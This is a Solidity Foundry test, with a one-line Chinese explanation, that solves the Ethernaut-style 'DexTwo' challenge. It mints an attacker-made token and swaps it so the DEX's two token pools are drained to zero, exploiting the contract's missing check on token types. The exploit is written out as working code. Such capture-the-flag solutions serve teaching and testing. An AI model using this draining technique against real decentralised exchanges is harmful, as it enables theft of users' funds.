由于 dex 没有限制代币类型，可以自己发新币去交易。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/DexTwo.sol";
import "src/levels/DexTwoFactory.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TestDexTwo is BaseTest {
    DexTwo private level;

    ERC20 token1;
    ERC20 token2;

    constructor() public {
        levelFactory = new DexTwoFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance(true));
        level = DexTwo(levelAddress);

        token1 = ERC20(level.token1());
        token2 = ERC20(level.token2());
        assertEq(token1.balanceOf(address(level)) == 100 && token2.balanceOf(address(level)) == 100, true);
        assertEq(token1.balanceOf(player) == 10 && token2.balanceOf(player) == 10, true);
    }

    function exploitLevel() internal override {

        vm.startPrank(player );

        SwappableTokenTwo myToken = new SwappableTokenTwo(address(level), "MyToken", "MT", 100);

        token1.approve(address(level), 2**256 - 1);
        token2.approve(address(level), 2**256 - 1);
        myToken.approve(address(level), 2**256 - 1);

        ERC20(myToken).transfer(address(level), 1);

        level.swap(address(myToken), address(token1), 1);
        level.swap(address(myToken), address(token2), 2);

        assertEq(token1.balanceOf(address(level)) == 0 && token2.balanceOf(address(level)) == 0, true);

        vm.stopPrank();
    }
}
```

